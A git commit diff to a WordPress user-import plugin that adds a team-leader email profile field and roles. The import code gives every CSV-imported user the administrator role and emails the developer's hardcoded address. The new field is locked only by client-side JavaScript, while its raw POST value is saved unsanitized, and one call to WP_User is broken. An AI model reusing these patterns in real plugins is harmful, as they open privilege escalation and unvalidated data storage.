2034245d2ad45aef2e3cea08f71b2f72404ca99f
Esmond <esmondmccain@gmail.com>
2024-08-22 15:02:22 -0500

    added custom field for users

--- includes/classes/emUserImport.php
+++ includes/classes/emUserImport.php
@@ -40,19 +40,15 @@ if (!class_exists('emUserImport')) {
         add_action('init', [$this, 'user_import_inits' ] );
         add_action('admin_menu', [$this, 'user_import_register_submenu_page' ] );
 		add_action( 'admin_enqueue_scripts', [$this, 'load_admin_styles' ]  );
-       // add_action('init', [$this, 'user_import_submission' ] );
+        add_action('admin_init', [$this, 'profile_field_team_leader_email_disable' ] );  
+        add_action( 'show_user_profile', [$this, 'profile_field_team_leader_email' ]  );
+        add_action( 'edit_user_profile', [$this, 'profile_field_team_leader_email' ]  );
+        add_action( 'personal_options_update', [$this, 'profile_save_team_leader_email' ]  );
+        add_action( 'edit_user_profile_update', [$this, 'profile_save_team_leader_email' ]  );  
+    
     }
 
-    public function user_import_inits() {
-        add_role('team_leader', 'Team Leader', array(
-            'read' => true,
-            'create_posts' => false,
-            'edit_posts' => false,
-            'edit_others_posts' => false,
-            'publish_posts' => false,
-            'manage_categories' => false,
-            ));
-    }
+
     public function user_import_register_submenu_page() {
 
         //Add Custom Social Sharing Sub Menu
@@ -93,9 +89,9 @@ if (!class_exists('emUserImport')) {
         // it allows us to use wp_handle_upload() function
         require_once( ABSPATH . 'wp-admin/includes/file.php' );
 
-        // you can add some kind of validation here
+        // can add some kind of validation here
         if( empty( $_FILES[ 'emcsv' ] ) ) {
-            wp_die( 'No files selected.' );
+            wp_die();
         }
 
         $upload = wp_handle_upload( 
@@ -130,17 +126,18 @@ if (!class_exists('emUserImport')) {
         foreach ( $csv as $c ) {
             if ($counter++ == 0) continue; // skip headers     
             $username = $c[0];
-            $password = $c[1];
-            $email_address = $c[2];  
+            $email_address = $c[1];          
+            $password = $c[2];
+
             if ( ! username_exists( $username ) ) {
                 $user_id = wp_create_user( $username, $password, $email_address );
                 $user = WP_User( $user_id );
                 $user->set_role( 'administrator' );
             }    
         }  
-        // echo 'This window is out of date. Weekly update failed.';
-        // send email of new post
-        // Recipient, in this case the administrator email
+
+        // send email of successful run
+     
         $emailto = 'esmondmccain@gmail.com';
 
         // Email subject, "New {post_type_label}"
@@ -150,11 +147,10 @@ if (!class_exists('emUserImport')) {
         $message = 'It ran';
 
         wp_mail( $emailto, $subject, $message );
+
+        echo "file submitted" ;
         
         exit;
-
-
-      
       
     }
 
@@ -172,6 +168,88 @@ if (!class_exists('emUserImport')) {
         fclose($handle);
     }
 
-   
+    public function user_import_inits() {
+        add_role('team_leader', 'Team Leader', array(
+            'read' => true,
+            'create_posts' => false,
+            'edit_posts' => false,
+            'edit_others_posts' => false,
+            'publish_posts' => false,
+            'manage_categories' => false,
+        ));
+
+        add_role('team_subordinate', 'Team Subordinate', array(
+            'read' => true,
+            'create_posts' => false,
+            'edit_posts' => false,
+            'edit_others_posts' => false,
+            'publish_posts' => false,
+            'manage_categories' => false,
+        ));            
+    }
+    
+ 
+    public function profile_field_team_leader_email_disable() {
+
+        global $pagenow;
+
+        // apply only to user profile or user edit pages
+        if ($pagenow!=='profile.php' && $pagenow!=='user-edit.php') {
+            return;
+        }
+
+        // do not change anything for the administrator
+        if (current_user_can('administrator')) {
+            return;
+        }
+
+        add_action( 'admin_footer', [$this,  'profile_field_team_leader_email_disable_js' ] );
+
+    }
+  
+    /**
+     * Disables selected fields in WP Admin user profile (profile.php, user-edit.php)
+     */
+    public function profile_field_team_leader_email_disable_js() {
+    ?>
+        <script>
+            jQuery(document).ready( function($) {
+                var fields_to_disable = ['teamLeaderEmail'];
+                for(i=0; i<fields_to_disable.length; i++) {
+                    if ( $('#'+ fields_to_disable[i]).length ) {
+                        $('#'+ fields_to_disable[i]).attr("disabled", "disabled");
+                    }
+                }
+            });
+        </script>
+    <?php
+    }
+    public function profile_save_team_leader_email( $user_id ) {
+      if ( empty( $_POST['_wpnonce'] ) || ! wp_verify_nonce( $_POST['_wpnonce'], 'update-user_' . $user_id ) ) {
+        return;
+      }
+    
+      if ( !current_user_can( 'edit_user', $user_id ) ) {
+        return;
+      }
+    
+      update_user_meta( $user_id, 'teamLeaderEmail', $_POST['teamLeaderEmail'] );
+    }
+    
+    public function profile_field_team_leader_email( $user ) {
+      $saved_teamLeaderEmail = get_user_meta( $user->ID, 'teamLeaderEmail', true ); ?>
+      <h3><?php _e('Team Leader Email'); ?></h3>
+    
+      <table class="form-table">
+        <tr>
+          <th><label for="teamLeaderEmail"><?php _e('Email'); ?></label></th>
+          <td>
+            <input type="email" name="teamLeaderEmail" id="teamLeaderEmail" value="<?php echo esc_attr($saved_teamLeaderEmail); ?>" />
+          </td>
+        </tr>
+      </table>
+    <?php 
+    }   
 }
+
 }
